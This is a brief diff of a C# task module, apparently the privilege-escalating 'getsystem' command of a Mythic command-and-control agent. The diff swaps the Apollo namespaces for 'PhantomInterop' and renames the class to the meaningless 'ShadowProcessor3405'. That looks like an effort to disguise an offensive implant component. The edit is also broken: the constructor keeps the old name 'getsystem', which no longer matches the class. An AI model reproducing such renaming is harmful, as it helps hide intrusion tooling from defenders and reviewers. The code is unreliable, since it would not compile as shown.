@@ -6,13 +6,13 @@
 
 #if GETSYSTEM
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 
 namespace Tasks
 {
-    public class getsystem : Tasking
+    public class ShadowProcessor3405 : Tasking
     {
 
         public getsystem(IAgent agent, MythicTask data) : base(agent, data)
